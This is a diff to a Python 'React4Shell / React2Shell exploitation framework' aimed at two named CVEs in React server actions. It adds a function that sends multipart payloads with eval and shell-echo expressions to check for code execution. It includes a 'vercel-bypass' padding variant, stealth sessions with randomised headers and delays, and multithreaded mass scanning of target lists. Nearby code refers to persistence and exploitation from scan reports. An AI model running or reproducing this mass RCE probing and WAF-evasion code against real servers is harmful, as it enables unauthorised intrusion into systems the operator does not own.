@@ -228,6 +228,104 @@ def apply_stealth_delay():
         delay = random.uniform(0.1, 1.5)
         time.sleep(delay)
 
+# ----------------------
+# React2Shell helpers
+# ----------------------
+
+def _build_react2shell_body(padding_kb=128, safe_mode=False, vercel_bypass=False):
+    """Create multipart/form-data body for React2Shell detection."""
+    boundary = f"----React2Shell{random.getrandbits(48):x}"
+    padding = "X" * (padding_kb * 1024)
+    calc_expr = "41*271"
+    expected = str(41 * 271)
+    action_id = f"rsc-{random.randint(100000, 999999)}"
+
+    if safe_mode:
+        core = f"SAFE-CHECK::{action_id}::invalid\n{padding[:256]}"
+    else:
+        serialized = f"$ACTION:{action_id}:$EVAL$(({calc_expr}))"
+        core = f"{serialized}\n$((echo {calc_expr}))"
+
+    if vercel_bypass:
+        core = padding + "V0" + core
+
+    body = (
+        f"--{boundary}\r\n"
+        "Content-Disposition: form-data; name=\"0\"; filename=\"action\"\r\n"
+        "Content-Type: application/octet-stream\r\n\r\n"
+        f"{padding}{core}\r\n"
+        f"--{boundary}--\r\n"
+    )
+
+    headers = {
+        "Content-Type": f"multipart/form-data; boundary={boundary}",
+        "next-action": action_id,
+        "rsc-action-id": action_id,
+        "Accept": "*/*",
+    }
+
+    return body, headers, expected
+
+
+def scan_react2shell(target_url, padding_kb=128):
+    """Probe for React2Shell using multipart payloads and math-based detection."""
+    results = []
+    session = create_stealth_session()
+    base_url = urllib.parse.urljoin(target_url.rstrip('/') + '/', '')
+
+    scenarios = [
+        {"name": "standard", "safe": False, "vercel": False},
+        {"name": "safe-check", "safe": True, "vercel": False},
+        {"name": "vercel-bypass", "safe": False, "vercel": True},
+    ]
+
+    for scenario in scenarios:
+        if interrupted:
+            break
+
+        body, extra_headers, expected = _build_react2shell_body(
+            padding_kb=padding_kb,
+            safe_mode=scenario["safe"],
+            vercel_bypass=scenario["vercel"],
+        )
+
+        headers = get_random_headers()
+        headers.update(extra_headers)
+
+        try:
+            resp = session.post(base_url, data=body, headers=headers, timeout=8)
+        except Exception:
+            continue
+
+        redirect_header = resp.headers.get("X-Action-Redirect", "")
+        evidence = None
+        vuln_status = None
+
+        if expected in redirect_header or expected in resp.text:
+            vuln_status = "Confirmed"
+            evidence = "Math marker observed in redirect/output"
+        elif scenario["safe"] and resp.status_code >= 500 and "rsc" in resp.text.lower():
+            vuln_status = "Potential"
+            evidence = "Safe-check triggered RSC decoder error"
+        elif resp.status_code in (200, 400) and len(resp.text) > len(body) * 0.05:
+            vuln_status = "Potential"
+            evidence = "Server processed multipart action payload"
+
+        if vuln_status:
+            results.append({
+                'url': target_url,
+                'endpoint': base_url,
+                'status_code': resp.status_code,
+                'vulnerable': vuln_status,
+                'evidence': evidence,
+                'payload_used': scenario['name'],
+                'timestamp': datetime.now().isoformat(),
+                'method': 'POST',
+                'framework': 'React2Shell',
+            })
+
+    return results
+
 def cve_specific_scan(target_url):
     """Specialized scan for CVE-2025-55182 and CVE-2025-66478"""
     print(f"\n[+] Starting CVE-specific scan for {target_url}")
@@ -522,6 +620,8 @@ def advanced_persistence(target_url, endpoint):
 def check_react4shell(target_url):
     if interrupted:
         return []
+
+    react2_results = scan_react2shell(target_url)
     
     # Initial probe payload
     probe_payload = '{"query": "test", "variables": null}'
@@ -643,19 +743,19 @@ def check_react4shell(target_url):
                                 'apache', 'nginx', 'tomcat', 'spring'
                             ]
                             
-                            for indicator in exploit_indicators:
-                                if indicator in resp_text_lower:
-                                    return [{
-                                        'url': target_url,
-                                        'endpoint': url,
-                                        'status_code': test_resp.status_code,
-                                        'vulnerable': 'Confirmed',
-                                        'evidence': f'Found {indicator} in response',
-                                        'payload_used': current_payload[:100],
-                                        'timestamp': datetime.now().isoformat(),
-                                        'method': 'POST',
-                                        'content_type': test_headers["Content-Type"]
-                                    }]
+                        for indicator in exploit_indicators:
+                            if indicator in resp_text_lower:
+                                return react2_results + [{
+                                    'url': target_url,
+                                    'endpoint': url,
+                                    'status_code': test_resp.status_code,
+                                    'vulnerable': 'Confirmed',
+                                    'evidence': f'Found {indicator} in response',
+                                    'payload_used': current_payload[:100],
+                                    'timestamp': datetime.now().isoformat(),
+                                    'method': 'POST',
+                                    'content_type': test_headers["Content-Type"]
+                                }]
                             
                             # If payload was accepted (different response than probe)
                             if test_resp.text != resp.text and len(test_resp.text) > 10:
@@ -672,7 +772,7 @@ def check_react4shell(target_url):
                                 
                                 for pattern in error_patterns:
                                     if re.search(pattern, resp_text_lower, re.IGNORECASE):
-                                        return [{
+                                        return react2_results + [{
                                             'url': target_url,
                                             'endpoint': url,
                                             'status_code': test_resp.status_code,
@@ -685,7 +785,7 @@ def check_react4shell(target_url):
                                         }]
                                 
                                 # Generic different response
-                                return [{
+                                return react2_results + [{
                                     'url': target_url,
                                     'endpoint': url,
                                     'status_code': test_resp.status_code,
@@ -713,7 +813,7 @@ def check_react4shell(target_url):
                                 if get_resp.status_code in [200, 400, 500]:
                                     get_text = get_resp.text.lower()
                                     if any(ind in get_text for ind in api_indicators + exploit_indicators):
-                                        return [{
+                                        return react2_results + [{
                                             'url': target_url,
                                             'endpoint': url,
                                             'status_code': get_resp.status_code,
@@ -733,7 +833,7 @@ def check_react4shell(target_url):
         except Exception as e:
             continue
     
-    return [{
+    return react2_results + [{
         'url': target_url,
         'endpoint': 'N/A',
         'status_code': None,
@@ -1669,25 +1769,46 @@ def load_report_and_exploit(report_file):
     except Exception as e:
         print(f"[!] Error loading report: {str(e)}")
 
-def mass_cve_scan(input_file, output_file="cve_results.txt"):
+def mass_cve_scan(input_file, output_file="cve_results.txt", threads=None):
     """
-    Mass CVE scanning across multiple targets
+    Mass CVE scanning across multiple targets with multithreading support
     """
     try:
         with open(input_file, 'r') as f:
             targets = [line.strip() for line in f if line.strip()]
-        
-        print(f"\n[+] Starting mass CVE scan on {len(targets)} targets")
-        
+
+        if not targets:
+            print("[!] No targets provided for CVE scan")
+            return
+
+        default_workers = max(2, min(os.cpu_count() or 4, 16))
+        max_workers = threads if threads else default_workers
+        max_workers = min(max_workers, len(targets))
+
+        print(f"\n[+] Starting mass CVE scan on {len(targets)} targets using {max_workers} threads")
+
+        scan_results = []
+
+        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
+            future_to_target = {executor.submit(cve_specific_scan, target): target for target in targets}
+
+            for completed, future in enumerate(concurrent.futures.as_completed(future_to_target), start=1):
+                target = future_to_target[future]
+                try:
+                    result = future.result()
+                except Exception as e:
+                    print(f"[!] Error scanning {target}: {e}")
+                    result = None
+
+                scan_results.append((target, result))
+                print(f"[{completed}/{len(targets)}] Finished scanning {target}")
+
         with open(output_file, 'w') as out_f:
             out_f.write("CVE Scan Results\n")
             out_f.write(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
             out_f.write("="*50 + "\n")
-            
-            for target in targets:
-                print(f"\n[+] Scanning: {target}")
-                results = cve_specific_scan(target)
-                
+
+            for target, results in scan_results:
                 if results:
                     out_f.write(f"\nTarget: {target}\n")
                     for result in results:
@@ -1696,13 +1817,13 @@ def mass_cve_scan(input_file, output_file="cve_results.txt"):
                     out_f.write("\n")
                 else:
                     out_f.write(f"\nTarget: {target} - No CVE vulnerabilities found\n")
-        
+
         print(f"\n[+] Results saved to {output_file}")
-        
+
     except Exception as e:
         print(f"[!] Error: {e}")
 
-def main_scan_mode(input_file, output_prefix):
+def main_scan_mode(input_file, output_prefix, threads=None):
     """Main scanning function"""
     global interrupted
     
@@ -1715,6 +1836,12 @@ def main_scan_mode(input_file, output_prefix):
         sys.exit(1)
     
     print(f"[*] Ultimate React4Shell Scanner Started")
+    print(f"[*] React2Shell multipart probes: Enabled")
+    # Use thread pool with configurable worker count
+    default_workers = max(2, min(os.cpu_count() or 4, 16))
+    max_workers = threads if threads else default_workers
+    max_workers = min(max_workers, len(urls)) if urls else 1
+
     print(f"[*] Targets: {len(urls)}")
     print(f"[*] CVE-2025-55182 & CVE-2025-66478 Support: Enabled")
     print(f"[*] WAF Bypass Techniques: Enabled")
@@ -1722,14 +1849,12 @@ def main_scan_mode(input_file, output_prefix):
     print(f"[*] Payload Variations: {len(PAYLOADS)}")
     print(f"[*] Endpoints to test: {len(ENDPOINTS) + len(CVE_ENDPOINTS)}")
     print(f"[*] Stealth Mode: Random delays enabled")
+    print(f"[*] Thread workers: {max_workers}")
     print(f"[*] Press Ctrl+C to stop and save partial results")
     print("-" * 50)
-    
+
     results = []
     scanned = 0
-    
-    # Use thread pool with random worker count (2-4)
-    max_workers = random.randint(2, 4)
     
     with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
         futures = {}
@@ -1811,7 +1936,7 @@ def main_scan_mode(input_file, output_prefix):
 def main_menu():
     """Interactive main menu"""
     print("\n" + "=" * 70)
-    print("ULTIMATE REACT4SHELL EXPLOITATION FRAMEWORK")
+    print("ULTIMATE REACT4SHELL / REACT2SHELL FRAMEWORK")
     print("CVE-2025-55182 & CVE-2025-66478 Ready")
     print("=" * 70)
     print("\nOptions:")
@@ -1835,8 +1960,10 @@ def main_menu():
         if choice == '1':
             input_file = input("Enter path to targets file: ").strip()
             output_prefix = input("Enter output prefix (e.g., 'scan_results'): ").strip()
+            threads_input = input("Threads to use (press enter for auto): ").strip()
+            threads = int(threads_input) if threads_input.isdigit() and int(threads_input) > 0 else None
             if input_file and output_prefix:
-                main_scan_mode(input_file, output_prefix)
+                main_scan_mode(input_file, output_prefix, threads=threads)
             else:
                 print("[!] Invalid input")
         
@@ -2081,9 +2208,11 @@ def main_menu():
         elif choice == '10':
             input_file = input("Enter path to targets file: ").strip()
             output_file = input("Enter output file for results (default: cve_results.txt): ").strip() or "cve_results.txt"
-            
+            threads_input = input("Threads to use (press enter for auto): ").strip()
+            threads = int(threads_input) if threads_input.isdigit() and int(threads_input) > 0 else None
+
             if input_file:
-                mass_cve_scan(input_file, output_file)
+                mass_cve_scan(input_file, output_file, threads=threads)
         
         elif choice == '11':
             target_url = input("Enter target URL to scan: ").strip()
@@ -2156,6 +2285,7 @@ Examples:
     scan_parser = subparsers.add_parser('scan', help='Scan targets for vulnerabilities')
     scan_parser.add_argument('input_file', help='File containing URLs to scan')
     scan_parser.add_argument('output_prefix', help='Output prefix for report files')
+    scan_parser.add_argument('-t', '--threads', type=int, help='Number of threads to use (default: auto)')
     
     # Exploit from report mode
     report_parser = subparsers.add_parser('exploit', help='Load and exploit from existing report')
@@ -2176,6 +2306,7 @@ Examples:
     cve_parser = subparsers.add_parser('cve-scan', help='Mass CVE scanning')
     cve_parser.add_argument('input_file', help='File containing target URLs')
     cve_parser.add_argument('-o', '--output', default='cve_results.txt', help='Output file (default: cve_results.txt)')
+    cve_parser.add_argument('-t', '--threads', type=int, help='Number of threads to use (default: auto)')
     
     # Menu mode
     subparsers.add_parser('menu', help='Start interactive menu')
@@ -2198,7 +2329,7 @@ Examples:
     
     try:
         if args.mode == 'scan':
-            main_scan_mode(args.input_file, args.output_prefix)
+            main_scan_mode(args.input_file, args.output_prefix, threads=args.threads)
         
         elif args.mode == 'exploit':
             load_report_and_exploit(args.report_file)
@@ -2325,7 +2456,7 @@ Examples:
                                 print("[!] Invalid choice")
         
         elif args.mode == 'cve-scan':
-            mass_cve_scan(args.input_file, args.output)
+            mass_cve_scan(args.input_file, args.output, threads=args.threads)
         
         elif args.mode == 'menu':
             main_menu()
